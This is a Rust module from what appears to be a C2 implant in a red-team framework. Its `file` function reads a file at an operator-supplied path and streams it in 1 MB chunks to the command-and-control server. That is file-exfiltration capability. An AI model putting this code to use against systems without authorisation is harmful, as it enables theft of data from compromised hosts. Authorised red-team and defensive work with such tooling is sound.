use alloc::boxed::Box;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use eldritch_agent::{Agent, Context};
use pb::c2::report_file_request;
use pb::{c2, eldritch};
use std::io::Read;
use std::sync::Mutex;

struct FileChunkIterator {
    file: std::fs::File,
    chunk_size: usize,
    context: Option<report_file_request::Context>,
    metadata_sent: bool,
    path: String,
    error: Arc<Mutex<Option<String>>>,
}

impl Iterator for FileChunkIterator {
    type Item = c2::ReportFileRequest;

    fn next(&mut self) -> Option<Self::Item> {
        let mut buffer = std::vec![0u8; self.chunk_size];
        match self.file.read(&mut buffer) {
            Ok(0) => None, // EOF
            Ok(n) => {
                buffer.truncate(n);

                let metadata = if !self.metadata_sent {
                    self.metadata_sent = true;
                    Some(eldritch::FileMetadata {
                        path: self.path.clone(),
                        ..Default::default()
                    })
                } else {
                    None
                };

                let file_msg = eldritch::File {
                    metadata,
                    chunk: buffer,
                };

                Some(c2::ReportFileRequest {
                    context: self.context.clone(),
                    chunk: Some(file_msg),
                    kind: c2::ReportFileKind::Ondisk as i32,
                })
            }
            Err(e) => {
                if let Ok(mut guard) = self.error.lock() {
                    *guard = Some(e.to_string());
                }
                None
            }
        }
    }
}

pub fn file(agent: Arc<dyn Agent>, context: Context, path: String) -> Result<(), String> {
    let file = std::fs::File::open(&path).map_err(|e| e.to_string())?;

    let context_val = match context {
        Context::Task(tc) => Some(report_file_request::Context::TaskContext(tc)),
        Context::ShellTask(stc) => Some(report_file_request::Context::ShellTaskContext(stc)),
    };

    let error = Arc::new(Mutex::new(None));
    let error_clone = error.clone();

    let iterator = FileChunkIterator {
        file,
        chunk_size: 1024 * 1024, // 1MB
        context: context_val,
        metadata_sent: false,
        path,
        error: error_clone,
    };

    let result = agent.report_file(Box::new(iterator)).map(|_| ());

    if let Ok(guard) = error.lock() {
        if let Some(err_msg) = guard.as_ref() {
            return Err(format!("File read error: {}", err_msg));
        }
    }

    result
}
